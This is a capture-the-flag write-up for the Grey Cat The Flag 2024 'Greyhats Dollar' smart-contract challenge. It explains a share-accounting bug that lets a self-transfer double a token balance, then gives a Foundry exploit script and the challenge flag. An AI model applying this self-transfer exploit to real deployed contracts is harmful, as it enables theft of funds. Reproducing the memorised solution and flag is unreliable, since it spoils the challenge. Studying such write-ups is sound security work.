---
title: Blockchain - Greyhats Dollar
description: 2024 | Grey Cat The Flag | Blockchain
tags:
    - smart contract
    - self transfer
---

## Description

Worried about inflation? Introducing GreyHats Dollar (GHD), the world's first currency with deflation built-in! Backed by GREY tokens, GHD will automatically deflate at a rate of 3% every year.

> nc challs.nusgreyhats.org 30201

> [Challenge Files](https://github.com/MiloTruck/evm-ctf-challenges/tree/8763f5fd12c3179227ec9cac0b21b959c6144dca/src/greyhats-dollar)

## Solution

- To solve the challenge, the player needs to obtain more than 50,000 GHD. Initially, we can exchange 1000 GREY for GHD, which is recorded in the form of share. Over time, the same proportion of shares will correspond to a reduced amount of GHD due to deflation

    ```js
    /**
     * @notice Updates the conversion rate between GHD and the underlying asset.
     */
    modifier update {
        conversionRate = _conversionRate();
        lastUpdated = block.timestamp;
        _;
    }

    function balanceOf(address user) public view returns (uint256) {
        return _sharesToGHD(shares[user], _conversionRate(), false);
    }
    ```

- Interestingly, during the token transfer, the data used to update account shares is calculated based on the cached old data. Since the data of `to` account is updated after `from` account, if a transfer is made to oneself, the account shares will increase :D

    ```js
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public update returns (bool) {
        if (from != msg.sender) allowance[from][msg.sender] -= amount;

        uint256 _shares = _GHDToShares(amount, conversionRate, false);
        uint256 fromShares = shares[from] - _shares;
        uint256 toShares = shares[to] + _shares;
        
        ...

        shares[from] = fromShares;
        shares[to] = toShares;

        emit Transfer(from, to, amount);

        return true;
    }
    ```

- We can continuously double the existing share through self-transfer

### Exploitation

```js
contract Solve is Script {
    function run() public {
        Setup setup = Setup(vm.envAddress("INSTANCE"));
        uint priv = vm.envUint("PRIV");

        GHD ghd = setup.ghd();
        GREY grey = setup.grey();

        vm.startBroadcast(priv);
        address user = vm.addr(priv);
        setup.claim();
        grey.approve(address(ghd), 1000 ether);
        ghd.mint(1000 ether);
        for(uint i; i < 50; i++) {
            ghd.transfer(user, 1000 ether);
        }
        require(setup.isSolved());
        vm.stopBroadcast();
    }
}
```

### Flag

> grey{self_transfer_go_brrr_9e8284917b42282d}
